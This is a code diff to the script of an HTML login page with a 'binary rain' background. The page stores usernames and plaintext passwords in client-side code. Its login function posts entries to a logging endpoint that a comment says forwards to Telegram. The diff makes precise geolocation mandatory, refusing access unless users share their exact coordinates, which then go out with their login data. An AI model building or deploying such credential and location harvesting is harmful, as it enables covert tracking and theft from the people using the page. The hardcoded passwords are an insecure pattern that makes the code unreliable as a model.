@@ -127,6 +127,7 @@
 </div>
 
 <script>
+    // Binary rain background
     function initBinaryRain() {
         const canvas = document.getElementById('binaryCanvas');
         const ctx = canvas.getContext('2d');
@@ -168,6 +169,7 @@
 
     initBinaryRain();
 
+    // Hardcoded users (same as original)
     const users = [
         { username: "Frankie", password: ".A" },
         { username: "Mari Chan", password: "Totot" },
@@ -184,6 +186,7 @@
     const errorMsg = document.getElementById('errorMsg');
 
     function performLogin(username, password, locationCoords = null) {
+        // Send log to Telegram (optional, keep original)
         fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -211,24 +214,28 @@
             return;
         }
 
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const coords = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude
-                    };
-                    performLogin(username, password, coords);
-                },
-                (error) => {
-                    console.warn("Geolocation denied or error:", error);
-                    performLogin(username, password, null);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        } else {
-            performLogin(username, password, null);
+        // Check if geolocation is supported
+        if (!("geolocation" in navigator)) {
+            errorMsg.textContent = '⚠️ LOCATION ACCESS REQUIRED. Your browser does not support geolocation. Access denied.';
+            return;
         }
+
+        // Require location permission before proceeding
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const coords = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                };
+                performLogin(username, password, coords);
+            },
+            (error) => {
+                // User denied or location error
+                console.warn("Geolocation error:", error);
+                errorMsg.textContent = '⚠️ LOCATION ACCESS REQUIRED. Please enable location and try again.';
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     });
 </script>
 </body>
